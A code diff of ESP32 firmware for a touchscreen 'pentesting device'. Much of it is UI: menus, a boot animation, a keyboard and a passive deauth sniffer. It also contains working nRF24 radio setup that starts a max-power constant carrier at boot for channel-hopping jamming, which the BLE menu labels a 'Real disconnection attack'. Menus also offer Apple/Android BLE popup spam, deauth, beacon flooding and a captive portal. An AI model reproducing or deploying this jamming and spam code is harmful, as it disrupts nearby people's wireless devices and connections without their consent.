+      tft.setCursor(SIDE_MARGIN + 90, y + 10);
+      if (ago < 60) {
+        tft.printf("%ds ago", ago);
+      } else {
+        tft.printf("%dm ago", ago / 60);
+      }
+    }
+  }
+  
+  // Scroll indicator
+  if (totalEvents > visibleEvents) {
+    tft.setTextColor(COLOR_PURPLE);
+    tft.setTextSize(1);
+    tft.setCursor(SCREEN_WIDTH / 2 - 40, listY + (visibleEvents * 32) + 5);
+    tft.printf("Scroll %d/%d", (deauthScrollOffset / visibleEvents) + 1, 
+               (totalEvents + visibleEvents - 1) / visibleEvents);
+  }
+  
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_ACCENT);
+  tft.setCursor(70, SCREEN_HEIGHT - 80);
+  tft.println("Tap to stop");
+}
+
+void handleDeauthSnifferMenuTouch(int x, int y) {
+  if (y > 300) {
+    if (deauthSnifferActive) stopDeauthSniffer();
+    currentState = MORE_TOOLS_MENU;
+    hoveredIndex = -1;
+    drawMoreToolsMenu();
+    return;
+  }
+  
+  int startY = HEADER_HEIGHT + 10;
+  int buttonIndex = getTouchedButtonIndex(y, startY);
+  
+  if (buttonIndex < 0 || buttonIndex > 2) return;
+  
+  switch (buttonIndex) {
+    case 0:  // Start Sniffer
+      if (!deauthSnifferActive) {
+        deauthScrollOffset = 0;
+        startDeauthSniffer();
+      }
+      break;
+      
+    case 1:  // Stop Sniffer
+      if (deauthSnifferActive) {
+        stopDeauthSniffer();
+        currentState = DEAUTH_SNIFFER;
+        drawDeauthSnifferMenu();
+      }
+      break;
+      
+    case 2:  // Change Channel
+      snifferChannel = (snifferChannel % 13) + 1;
+      if (deauthSnifferActive) {
+        esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
+      }
+      drawDeauthSnifferMenu();
+      break;
+  }
+}
+
 // In setup(), REPLACE the WiFi initialization section with:
 void setup() {
   Serial.begin(115200);
+  delay(1000);
   
-  // FIX: Add watchdog timer
+  Serial.println("\n╔═══════════════════════════════════════╗");
+  Serial.println("║     P4WNC4K3 PENTESTING DEVICE        ║");
+  Serial.println("║         Initializing...                ║");
+  Serial.println("╚═══════════════════════════════════════╝\n");
+  
+  // ==================== WATCHDOG TIMER ====================
+  Serial.print("[*] Init Watchdog Timer... ");
   esp_task_wdt_init(30, true);
   esp_task_wdt_add(NULL);
+  Serial.println("OK");
   
-  // Initialize TFT
+  // ==================== TFT DISPLAY ====================
+  Serial.print("[*] Init TFT Display... ");
   tft.init();
-  tft.setRotation(0);
+  tft.setRotation(0);  // Portrait mode
   tft.fillScreen(COLOR_BG);
   pinMode(TFT_BL, OUTPUT);
   digitalWrite(TFT_BL, HIGH);
+  Serial.println("OK");
   
   // Touch calibration
   uint16_t calData[5] = {275, 3620, 320, 3590, 4};
   tft.setTouch(calData);
   
-  // WiFi initialization - CRITICAL for deauth
+  // ==================== WIFI INITIALIZATION ====================
+  Serial.print("[*] Init WiFi subsystem... ");
   WiFi.mode(WIFI_MODE_NULL);
   delay(100);
-  esp_wifi_start();  // Start WiFi subsystem
+  esp_wifi_start();
   delay(100);
+  Serial.println("OK");
   
-  // ✅ Do NOT call esp_wifi_set_promiscuous or esp_wifi_start here!
-  // Let the attack functions handle WiFi initialization
-  
-  // Initialize nRF24L01 modules
-  Serial.println("Initializing nRF24L01 modules...");
-  hspi.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI, -1);
-  delay(50);
-
-  // Initialize SPIFFS
+  // ==================== SPIFFS INITIALIZATION ====================
+  Serial.print("[*] Init SPIFFS... ");
   if (!SPIFFS.begin(true)) {
-    Serial.println("SPIFFS Mount Failed");
+    Serial.println("FAIL - Formatting...");
     SPIFFS.format();
     SPIFFS.begin(true);
-  }
-  
-  // Radio initialization...
-  if (radio1.begin(&hspi)) {
-    radio1.setAutoAck(false);
-    radio1.setPALevel(RF24_PA_MAX);
-    radio1.setDataRate(RF24_2MBPS);
-    radio1.stopListening();
-    radio1.setChannel(nrfChannel);
-    nrf1Available = true;
-    addToConsole("nRF24#1 initialized");
+    Serial.println("OK (formatted)");
   } else {
-    addToConsole("nRF24#1 init failed!");
+    Serial.println("OK");
   }
   
+  // ==================== nRF24 INITIALIZATION (OPTIMIZED) ====================
+  Serial.println("\n[*] Initializing nRF24L01 modules...");
+  Serial.println("    Using constant carrier method (Smoochiee)");
+
+  // Init HSPI bus with 16 MHz speed
+  Serial.print("    HSPI bus (16 MHz)... ");
+  hspi.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI, -1);
+  hspi.setFrequency(NRF_SPI_SPEED);  // ⬅️ CRITICAL: Set 16 MHz
+  hspi.setDataMode(SPI_MODE0);
+  hspi.setBitOrder(MSBFIRST);
+
+  // Set CS and CE pins
+  pinMode(NRF1_CSN_PIN, OUTPUT);
+  pinMode(NRF2_CSN_PIN, OUTPUT);
+  pinMode(NRF1_CE_PIN, OUTPUT);
+  pinMode(NRF2_CE_PIN, OUTPUT);
+  digitalWrite(NRF1_CSN_PIN, HIGH);
+  digitalWrite(NRF2_CSN_PIN, HIGH);
+  digitalWrite(NRF1_CE_PIN, LOW);
+  digitalWrite(NRF2_CE_PIN, LOW);
   delay(100);
-  
-  if (radio2.begin(&hspi)) {
-    radio2.setAutoAck(false);
-    radio2.setPALevel(RF24_PA_MAX);
-    radio2.setDataRate(RF24_2MBPS);
-    radio2.stopListening();
-    radio2.setChannel(nrfChannel + 25);
-    nrf2Available = true;
-    addToConsole("nRF24#2 initialized");
-  } else {
-    addToConsole("nRF24#2 init failed!");
-  }
+  Serial.println("OK");
+
+  // ===== RADIO 1 INITIALIZATION =====
+  Serial.print("[RADIO 1] CE=26, CSN=25... ");
+  if (radio1.begin(&hspi)) {
+    radio1.setDataRate(RF24_2MBPS);
+    radio1.setAutoAck(false);
+    radio1.setCRCLength(RF24_CRC_DISABLED);
+    radio1.setPALevel(RF24_PA_MAX);
+    radio1.setRetries(0, 0);
+    radio1.stopListening();
     
+    // ✅ START CONSTANT CARRIER ONCE
+    radio1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]);
+    delay(50);
+    nrf1Available = true;
+    Serial.println("✅ DETECTED - Carrier ON");
+  } else {
+    Serial.println("❌ NOT FOUND");
+  }
+
+  // ===== RADIO 2 INITIALIZATION =====
+  Serial.print("[RADIO 2] CE=33, CSN=27... ");
+  if (radio2.begin(&hspi)) {
+    radio2.setDataRate(RF24_2MBPS);
+    radio2.setAutoAck(false);
+    radio2.setCRCLength(RF24_CRC_DISABLED);
+    radio2.setPALevel(RF24_PA_MAX);
+    radio2.setRetries(0, 0);
+    radio2.stopListening();
+    
+    // ✅ START CONSTANT CARRIER ONCE
+    radio2.startConstCarrier(RF24_PA_MAX, hopping_channel[ptr_hop2]);
+    delay(50);
+    nrf2Available = true;
+    Serial.println("✅ DETECTED - Carrier ON");
+  } else {
+    Serial.println("❌ NOT FOUND");
+  }
+
+  // ===== STATUS SUMMARY =====
+  Serial.println();
   if (nrf1Available && nrf2Available) {
-    addToConsole("DUAL nRF24 mode ready!");
+    Serial.println("[+] DUAL nRF24 MODE - Both radios ready!");
+    Serial.println("    Target: 50K-80K hops/sec (shared HSPI)");
+    Serial.println("    Using 16 MHz SPI speed");
+    addToConsole("DUAL nRF24 @ 16MHz");
+    dualNRFMode = true;
   } else if (nrf1Available || nrf2Available) {
-    addToConsole("Single nRF24 mode");
+    Serial.println("[+] SINGLE nRF24 MODE - One radio ready");
+    Serial.println("    Target: 30K-50K hops/sec");
+    addToConsole("Single nRF24");
     dualNRFMode = false;
+  } else {
+    Serial.println("[!] WARNING: No nRF24 modules detected");
+    addToConsole("WARNING: No nRF24!");
   }
   
-  // Boot animation
+  // ==================== BOOT ANIMATION ====================
+  Serial.println("\n[*] Starting boot animation...");
   playBootAnimation();
   
+  // ==================== CONSOLE INITIALIZATION ====================
   addToConsole("P4WNC4K3 initialized");
   addToConsole("System ready for pentest");
   
-  // Draw main menu
+  // ==================== DRAW MAIN MENU ====================
+  Serial.println("\n[+] System initialization complete!");
+  Serial.println("    Ready for pentesting operations\n");
+  
   currentState = MAIN_MENU;
   drawMainMenu();
+  
+  Serial.println("╔═══════════════════════════════════════╗");
+  Serial.println("║         SYSTEM READY                   ║");
+  Serial.println("╚═══════════════════════════════════════╝");
+  Serial.println("\nType 'help' in serial console for commands");
+  Serial.println();
 }
 
 #define COLOR_HEADER    0x0208  // Very dark blue-grey
@@ -1442,20 +2042,17 @@ void displayIntegratedBoot() {
   
   // ===== TALLER & SLIMMER SKULL - Adjusted rendering =====
   int lineCount = 27;
-  int pixelsPerChar = 3;  // Smaller pixels for taller/slimmer look
+  int pixelsPerChar = 3;
   
-  int maxLineWidth = 41;  // Original width
-  int totalMaskWidth = maxLineWidth * pixelsPerChar;  // 123px (slimmer)
-  int totalMaskHeight = lineCount * pixelsPerChar;     // 81px (but vertically stretched)
+  int maxLineWidth = 41;
+  int totalMaskWidth = maxLineWidth * pixelsPerChar;
+  int totalMaskHeight = lineCount * pixelsPerChar;
   
-  int maskStartX = (240 - totalMaskWidth) / 2;  // Center horizontally
-  int maskStartY = 15;  // Start position
+  int maskStartX = (240 - totalMaskWidth) / 2;
+  int maskStartY = 15;
   
-  // Parse ASCII art
-  char lines[27][42];  // 41 chars + null terminator
-  int lineIndex = 0;
-  int charIndex = 0;
-  int linePos = 0;
+  // ✅ FIX: Move to heap to avoid stack overflow
+  char (*lines)[42] = new char[27][42];
   
   // Clear array first
   for (int i = 0; i < 27; i++) {
@@ -1463,6 +2060,10 @@ void displayIntegratedBoot() {
       lines[i][j] = '\0';
     }
   }
+  
+  int lineIndex = 0;
+  int charIndex = 0;
+  int linePos = 0;
   
   while (lineIndex < 27) {
     char c = pgm_read_byte(&maskASCII[charIndex]);
@@ -1479,15 +2080,13 @@ void displayIntegratedBoot() {
     if (charIndex > 2000) break;
   }
   
-  // Add null terminator to last line if needed
   if (lineIndex < 27 && linePos > 0) {
     lines[lineIndex][linePos] = '\0';
   }
   
-  // ===== MESSAGES AT BOTTOM (Y: 190+) =====
+  // ===== MESSAGES AT BOTTOM =====
   int msgStartY = 190;
   
-  // Title line
   tft.setTextSize(1);
   tft.setTextColor(COLOR_RED);
   tft.setCursor(5, msgStartY);
@@ -1497,9 +2096,8 @@ void displayIntegratedBoot() {
   msgStartY += 12;
   
   tft.drawLine(0, msgStartY, 240, msgStartY, COLOR_DARK_GREEN);
-  msgStartY += 8;  // Y=210
+  msgStartY += 8;
   
-  // Modules (2 columns, tight spacing)
   const char* modules[] = {"WiFi", "BLE", "nRF#1", "nRF#2", "SPIFFS", "TFT"};
   int moduleY[6];
   int col1X = 8;
@@ -1508,7 +2106,7 @@ void displayIntegratedBoot() {
   for (int i = 0; i < 6; i++) {
     int x = (i < 3) ? col1X : col2X;
     int row = (i < 3) ? i : (i - 3);
-    moduleY[i] = msgStartY + (row * 11);  // 11px spacing
+    moduleY[i] = msgStartY + (row * 11);
     
     tft.setTextColor(COLOR_TEXT);
     tft.setCursor(x, moduleY[i]);
@@ -1520,9 +2118,7 @@ void displayIntegratedBoot() {
     tft.print(modules[i]);
   }
   
-  // ===== ANIMATE SKULL (RANDOM PIXELS) =====
-  
-  // Track which pixels have been revealed
+  // ===== ANIMATE SKULL =====
   bool revealed[27][41];
   for (int y = 0; y < 27; y++) {
     for (int x = 0; x < 41; x++) {
@@ -1530,7 +2126,6 @@ void displayIntegratedBoot() {
     }
   }
   
-  // Count total valid pixels
   int totalPixels = 0;
   for (int y = 0; y < 27; y++) {
     for (int x = 0; x < 41; x++) {
@@ -1544,47 +2139,42 @@ void displayIntegratedBoot() {
   int pixelsRevealed = 0;
   int moduleIndex = 0;
   int pixelsPerModule = (totalPixels > 0) ? (totalPixels / 6) : 1;
-  int animationSteps = 15;  // Pixels to reveal per frame
+  int animationSteps = 15;
   
-  // Reveal pixels randomly
   while (pixelsRevealed < totalPixels) {
+    // Feed watchdog every iteration
+    esp_task_wdt_reset();
+    
     for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
-      // Pick random position
       int randY = random(0, 27);
       int randX = random(0, 41);
       
-      // Skip if already revealed
       if (revealed[randY][randX]) {
         continue;
       }
       
       char pixel = lines[randY][randX];
       
-      // Skip if it's a transparent pixel
       if (pixel == 'c' || pixel == '\0') {
         revealed[randY][randX] = true;
         continue;
       }
       
-      // Mark as revealed
       revealed[randY][randX] = true;
       pixelsRevealed++;
       
       int xPos = maskStartX + (randX * pixelsPerChar);
-      int yPos = maskStartY + (randY * pixelsPerChar) + (randY * pixelsPerChar);  // Double the vertical spacing
+      int yPos = maskStartY + (randY * pixelsPerChar) + (randY * pixelsPerChar);
       
-      // Color depth based on character
       uint16_t color;
       if (pixel == 'h') color = COLOR_GREEN;
       else if (pixel == 'a') color = COLOR_DARK_GREEN;
-      else if (pixel == 'k') color = COLOR_GREEN;  // Changed from COLOR_LIME to match the mask
+      else if (pixel == 'k') color = COLOR_GREEN;
       else color = COLOR_GREEN;
       
-      // Draw pixel blocks with vertical stretch (height only, not position)
       tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
     }
     
-    // Update module status
     int currentModule = pixelsRevealed / pixelsPerModule;
     if (currentModule > moduleIndex && currentModule <= 6) {
       for (int m = moduleIndex; m < currentModule && m < 6; m++) {
@@ -1610,10 +2200,9 @@ void displayIntegratedBoot() {
       moduleIndex = currentModule;
     }
     
-    delay(5);  // Smooth animation
+    delay(5);
   }
   
-  // Complete remaining modules
   for (int i = moduleIndex; i < 6; i++) {
     uint16_t statusColor = COLOR_SUCCESS;
     String statusText = "OK";
@@ -1630,7 +2219,7 @@ void displayIntegratedBoot() {
     delay(80);
   }
   
-  // ===== FINAL STATUS (at bottom Y=270) =====
+  // ===== FINAL STATUS =====
   int finalY = 270;
   tft.drawLine(0, finalY, 240, finalY, COLOR_DARK_GREEN);
   finalY += 6;
@@ -1650,6 +2239,8 @@ void displayIntegratedBoot() {
   tft.print("root@p4wncak3:~# ");
   tft.setTextColor(COLOR_TEXT);
   tft.println("ready");
+  
+  delete[] lines;
   
   delay(1500);
 }
@@ -1887,11 +2478,12 @@ void drawBeaconAddScreen() {
     tft.print("Enter SSID...");
   }
   
+  // NEW KEYBOARD - lowercase + numbers
   int keyY = inputY + 40;
   const char* keyboard[4][10] = {
-    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
-    {"A", "S", "D", "F", "G", "H", "J", "K", "L", "_"},
-    {"Z", "X", "C", "V", "B", "N", "M", "-", ".", " "},
+    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
+    {"a", "s", "d", "f", "g", "h", "j", "k", "l", "_"},
+    {"z", "x", "c", "v", "b", "n", "m", "-", ".", " "},
     {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
   };
   
@@ -1916,6 +2508,7 @@ void drawBeaconAddScreen() {
   
   int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
   
+  // BACKSPACE button
   tft.fillRect(SIDE_MARGIN, controlY, 70, 25, COLOR_WARNING);
   tft.drawRect(SIDE_MARGIN, controlY, 70, 25, COLOR_CRITICAL);
   tft.setTextSize(1);
@@ -1923,12 +2516,14 @@ void drawBeaconAddScreen() {
   tft.setCursor(SIDE_MARGIN + 10, controlY + 9);
   tft.print("BACKSPACE");
   
+  // SAVE button
   tft.fillRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_SUCCESS);
   tft.drawRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_MATRIX_GREEN);
   tft.setTextColor(COLOR_BG);
   tft.setCursor(SIDE_MARGIN + 95, controlY + 9);
   tft.print("SAVE");
   
+  // CANCEL button
   tft.fillRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_CRITICAL);
   tft.drawRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_WARNING);
   tft.setTextColor(COLOR_TEXT);
@@ -1938,20 +2533,29 @@ void drawBeaconAddScreen() {
 
 void drawBLEMenu() {
   tft.fillScreen(COLOR_BG);
-  drawTerminalHeader("bluetooth");
+  drawTerminalHeader("bluetooth tools");
   
   const char* menuItems[] = {
-    "Scan BLE",
-    "BLE Jammer",
-    "BLE Spam",
-    "AirTag Scan"
+    "nRF24 Jammer",      // Real disconnection attack
+    "Apple/Android Spam", // BLE spam attacks
+    "Scan BLE",          // Keep for info only
+    "AirTag Scan",       // Keep for detection
+    "Skimmer Detect"     // Keep for detection
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 4; i++) {
+  for (int i = 0; i < 5; i++) {
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
+  
+  // Warning message
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y + 10);
+  tft.println("nRF24 = Real disconnect");
+  tft.setCursor(SIDE_MARGIN, y + 22);
+  tft.println("Spam = Popups only");
   
   // Back button
   int backY = 305;
@@ -2066,13 +2670,14 @@ void drawMoreToolsMenu() {
   drawTerminalHeader("more tools");
   
   const char* menuItems[] = {
+    "Deauth Sniffer",  // NEW - moved to top
     "Skimmer Detect",
     "Wardriving",
     "Console"
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 3; i++) {
+  for (int i = 0; i < 4; i++) {  // Changed from 3 to 4
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
@@ -2136,50 +2741,7 @@ void drawSpamMenu() {
   
   const char* menuItems[] = {
     appleSpamActive ? "Stop Apple" : "Apple Spam",
-    androidSpamActive ? "Stop Android" : "Android Spam",
-    "Windows Spam"
-  };
-  
-  int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 3; i++) {
-    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
-    y += MENU_ITEM_HEIGHT + MENU_SPACING;
-  }
-  
-  // Status section
-  y = HEADER_HEIGHT + 110;
-  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
-  
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(SIDE_MARGIN, y);
-  tft.printf("Apple: ");
-  tft.setTextColor(appleSpamActive ? COLOR_ORANGE : COLOR_TEXT);
-  tft.printf(appleSpamActive ? "ACTIVE" : "OFF");
-  
-  y += 15;
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(SIDE_MARGIN, y);
-  tft.printf("Android: ");
-  tft.setTextColor(androidSpamActive ? COLOR_ORANGE : COLOR_TEXT);
-  tft.printf(androidSpamActive ? "ACTIVE" : "OFF");
-  
-  // Back button
-  int backY = 305;
-  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
-  tft.setTextColor(COLOR_RED);
-  tft.setCursor(85, backY + 3);
-  tft.print("[ESC] Back");
-}
-
-void drawNRFJammerMenu() {
-  tft.fillScreen(COLOR_BG);
-  drawTerminalHeader("nrf24 jam");
-  
-  const char* menuItems[] = {
-    nrfJammerActive ? "Stop Jammer" : "Start Jammer",
-    "Toggle Dual"
+    androidSpamActive ? "Stop Android" : "Android Spam"
   };
   
   int y = HEADER_HEIGHT + 10;
@@ -2193,6 +2755,80 @@ void drawNRFJammerMenu() {
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
   y += 10;
   
+  // Apple status
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Apple: ");
+  tft.setTextColor(appleSpamActive ? COLOR_ORANGE : COLOR_TEXT);
+  tft.printf(appleSpamActive ? "ACTIVE" : "OFF");
+  
+  if (appleSpamActive) {
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(SIDE_MARGIN + 90, y);
+    tft.printf("(%d)", appleSpamCount);
+  }
+  
+  y += 15;
+  
+  // Android status
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Android: ");
+  tft.setTextColor(androidSpamActive ? COLOR_ORANGE : COLOR_TEXT);
+  tft.printf(androidSpamActive ? "ACTIVE" : "OFF");
+  
+  if (androidSpamActive) {
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(SIDE_MARGIN + 90, y);
+    tft.printf("(%d)", androidSpamCount);
+  }
+  
+  y += 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
+  // Info
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Creates popup dialogs on");
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("nearby phones (discovery)");
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Does NOT disconnect devices");
+  
+  // Back button
+  int backY = 305;
+  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(85, backY + 3);
+  tft.print("[ESC] Back");
+}
+
+void drawNRFJammerMenu() {
+  tft.fillScreen(COLOR_BG);
+  drawTerminalHeader("nrf24 jam");
+  
+  // Updated menu items with mode selector
+  const char* menuItems[] = {
+    nrfJammerActive ? "Stop Jammer" : "Start Jammer",
+    "Toggle Dual",
+    "Cycle Mode"
+  };
+  
+  int y = HEADER_HEIGHT + 10;
+  for (int i = 0; i < 3; i++) {
+    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
+    y += MENU_ITEM_HEIGHT + MENU_SPACING;
+  }
+  
+  // Status section
+  y = HEADER_HEIGHT + 100;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
   tft.setTextSize(1);
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
@@ -2203,15 +2839,40 @@ void drawNRFJammerMenu() {
   y += 15;
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Pattern: ");
+  
+  // Show current jamming mode
+  const char* modeName = "";
+  uint16_t modeColor = COLOR_GREEN;
+  switch (nrfJamMode) {
+    case NRF_SWEEP:
+      modeName = "SWEEP";
+      modeColor = COLOR_GREEN;
+      break;
+    case NRF_RANDOM:
+      modeName = "RANDOM";
+      modeColor = COLOR_CYAN;
+      break;
+    case NRF_FOCUSED:
+      modeName = "FOCUSED";
+      modeColor = COLOR_ORANGE;
+      break;
+  }
+  tft.setTextColor(modeColor);
+  tft.printf("%s", modeName);
+  
+  y += 15;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Radio 1: ");
-  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_ORANGE);
+  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
   tft.printf(nrf1Available ? "OK" : "FAIL");
   
   y += 15;
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Radio 2: ");
-  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_ORANGE);
+  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
   tft.printf(nrf2Available ? "OK" : "FAIL");
   
   if (nrfJammerActive) {
@@ -2229,6 +2890,49 @@ void drawNRFJammerMenu() {
     tft.setTextColor(COLOR_CYAN);
     tft.printf("%d", nrfJamPackets);
   }
+  
+  // Info box - Mode descriptions
+  y += 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 8;
+  
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("MODE GUIDE:");
+  y += 12;
+  
+  tft.setTextColor(COLOR_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("SWEEP");
+  tft.setTextColor(COLOR_TEXT);
+  tft.print(" = ");
+  tft.println("Smoochiee's sweep");
+  y += 10;
+  tft.setCursor(SIDE_MARGIN + 10, y);
+  tft.println("pattern. Most effective!");
+  y += 14;
+  
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("RANDOM");
+  tft.setTextColor(COLOR_TEXT);
+  tft.print(" = ");
+  tft.println("Chaotic hopping");
+  y += 10;
+  tft.setCursor(SIDE_MARGIN + 10, y);
+  tft.println("across all channels.");
+  y += 14;
+  
+  tft.setTextColor(COLOR_ORANGE);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("FOCUSED");
+  tft.setTextColor(COLOR_TEXT);
+  tft.print(" = ");
+  tft.println("Targets BLE");
+  y += 10;
+  tft.setCursor(SIDE_MARGIN + 10, y);
+  tft.println("advertising channels.");
   
   // Back button
   int backY = 305;
@@ -2441,6 +3145,7 @@ void handleTouch() {
         break;
         
       case NRF_JAM_ACTIVE:
+        // ANY tap stops jammer and goes back
         stopNRFJammer();
         currentState = NRF_JAM_MENU;
         hoveredIndex = -1;
@@ -2449,6 +3154,30 @@ void handleTouch() {
         
       case WIFI_BLE_NRF_JAM:
         stopCombinedJammer();
+        break;
+
+      case DEAUTH_SNIFFER:
+        handleDeauthSnifferMenuTouch(touchX, touchY);
+        break;
+
+      case DEAUTH_SNIFFER_ACTIVE:
+        if (touchY > 300) {
+          stopDeauthSniffer();
+          currentState = DEAUTH_SNIFFER;
+          drawDeauthSnifferMenu();
+        } else {
+          // Scroll through deauth events
+          int listY = HEADER_HEIGHT + 35;
+          if (touchY > listY && touchY < 280) {
+            if (deauthScrollOffset + MAX_DEAUTH_DISPLAY < deauthEventCount) {
+              deauthScrollOffset++;
+              displayDeauthSnifferActive();
+            }
+          } else if (touchY < listY && deauthScrollOffset > 0) {
+            deauthScrollOffset--;
+            displayDeauthSnifferActive();
+          }
+        }
         break;
         
       // ===== FIXED: AirTag Scanner =====
@@ -2613,6 +3342,20 @@ void handleBackButton() {
       hoveredIndex = -1;
       drawBLEMenu();
       break;
+
+    case DEAUTH_SNIFFER:
+      if (deauthSnifferActive) stopDeauthSniffer();
+      currentState = MORE_TOOLS_MENU;
+      hoveredIndex = -1;
+      drawMoreToolsMenu();
+      break;
+
+    case DEAUTH_SNIFFER_ACTIVE:
+      stopDeauthSniffer();
+      currentState = MORE_TOOLS_MENU;
+      hoveredIndex = -1;
+      drawMoreToolsMenu();
+      break;
       
     case AIRTAG_SCANNER:
     case AIRTAG_RESULTS:
@@ -2765,6 +3508,50 @@ void handleWiFiMenuTouch(int x, int y) {
   }
 }
 
+void checkHeapHealth() {
+  static unsigned long lastCheck = 0;
+  
+  if (millis() - lastCheck < 5000) return;
+  lastCheck = millis();
+  
+  uint32_t freeHeap = ESP.getFreeHeap();
+  uint32_t minHeap = ESP.getMinFreeHeap();
+  
+  // Warning level
+  if (freeHeap < 40000) {
+    Serial.printf("[!] LOW MEMORY: %d bytes free (min: %d)\n", freeHeap, minHeap);
+    addToConsole("WARN: Low memory");
+  }
+  
+  // Critical level - emergency cleanup
+  if (freeHeap < 25000) {
+    Serial.println("[!!!] CRITICAL MEMORY - EMERGENCY CLEANUP");
+    addToConsole("CRITICAL: Out of memory!");
+    
+    // Stop all operations
+    if (deauthActive) stopDeauth();
+    if (bleJammerActive) stopBLEJammer();
+    if (nrfJammerActive) stopNRFJammer();
+    if (snifferActive) stopSniffer();
+    if (portalActive) stopCaptivePortal();
+    if (appleSpamActive) stopAppleSpam();
+    if (androidSpamActive) stopAndroidSpam();
+    
+    // Clear buffers
+    for (int i = 0; i < 15; i++) {
+      consoleBuffer[i] = "";
+    }
+    
+    delay(500);
+    
+    Serial.printf("[*] After cleanup: %d bytes free\n", ESP.getFreeHeap());
+    
+    // Return to main menu
+    currentState = MAIN_MENU;
+    drawMainMenu();
+  }
+}
+
 void handleBeaconManagerTouch(int x, int y) {
   if (y > 300) {
     if (beaconFloodActive) {
@@ -2834,10 +3621,11 @@ void handleBeaconAddTouch(int x, int y) {
   int keyH = 26;
   int keySpacing = 2;
   
+  // NEW KEYBOARD - lowercase + numbers
   const char* keyboard[4][10] = {
-    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
-    {"A", "S", "D", "F", "G", "H", "J", "K", "L", "_"},
-    {"Z", "X", "C", "V", "B", "N", "M", "-", ".", " "},
+    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
+    {"a", "s", "d", "f", "g", "h", "j", "k", "l", "_"},
+    {"z", "x", "c", "v", "b", "n", "m", "-", ".", " "},
     {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
   };
   
@@ -2858,6 +3646,7 @@ void handleBeaconAddTouch(int x, int y) {
   
   int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
   
+  // BACKSPACE
   if (x >= SIDE_MARGIN && x <= SIDE_MARGIN + 70 && y >= controlY && y <= controlY + 25) {
     if (beaconInputSSID.length() > 0) {
       beaconInputSSID.remove(beaconInputSSID.length() - 1);
@@ -2866,6 +3655,7 @@ void handleBeaconAddTouch(int x, int y) {
     return;
   }
   
+  // SAVE
   if (x >= SIDE_MARGIN + 75 && x <= SIDE_MARGIN + 145 && y >= controlY && y <= controlY + 25) {
     if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
       customBeacons[customBeaconCount] = beaconInputSSID;
@@ -2878,6 +3668,7 @@ void handleBeaconAddTouch(int x, int y) {
     return;
   }
   
+  // CANCEL
   if (x >= SIDE_MARGIN + 150 && x <= SIDE_MARGIN + 220 && y >= controlY && y <= controlY + 25) {
     beaconInputSSID = "";
     currentState = BEACON_MANAGER;
